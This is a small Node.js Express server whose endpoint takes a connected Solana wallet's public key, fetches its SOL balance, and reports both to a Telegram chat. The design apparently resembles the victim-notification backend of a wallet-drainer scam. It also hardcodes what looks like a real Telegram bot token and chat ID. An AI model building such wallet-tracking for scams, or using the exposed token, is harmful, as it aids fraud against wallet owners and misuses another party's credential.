const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

// Replace with your Telegram bot token and chat ID
const TELEGRAM_BOT_TOKEN = '7771181963:AAFeCvIsgIwH7xD7QtIoRn7H9olrx7RoQrM';
const TELEGRAM_CHAT_ID = '6746140279';

// Endpoint to handle wallet connections
app.post('/wallet-connected', async (req, res) => {
  const { publicKey } = req.body;

  // Get balance from Solana network
  const balance = await getSolanaBalance(publicKey);

  // Send Telegram notification
  await sendTelegramMessage(
    `💰 New Wallet Connected!\n\n` +
    `Public Key: ${publicKey}\n` +
    `Balance: ${balance} SOL`
  );

  res.send({ success: true });
});

// Fetch SOL balance
async function getSolanaBalance(publicKey) {
  try {
    const response = await axios.post('https://api.mainnet-beta.solana.com', {
      jsonrpc: '2.0',
      id: 1,
      method: 'getBalance',
      params: [publicKey],
    });
    return response.data.result.value / 1000000000; // Convert lamports to SOL
  } catch (err) {
    console.error('Balance check failed:', err);
    return 'Unknown';
  }
}

async function sendTelegramMessage(text) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  const payload = { chat_id: TELEGRAM_CHAT_ID, text };

  console.log("Sending to Telegram:", { url, payload }); // 👈 Log request details

  try {
    const response = await axios.post(url, payload);
    console.log("Telegram success:", response.data); // 👈 Log full response
    return true;
  } catch (err) {
    console.error("Telegram API error:", {
      status: err.response?.status,
      data: err.response?.data, // 👈 Telegram's error message
      config: err.config, // 👈 Shows the exact request sent
    });
    return false;
  }
}

app.listen(3000, () => console.log('Server running on port 3000'));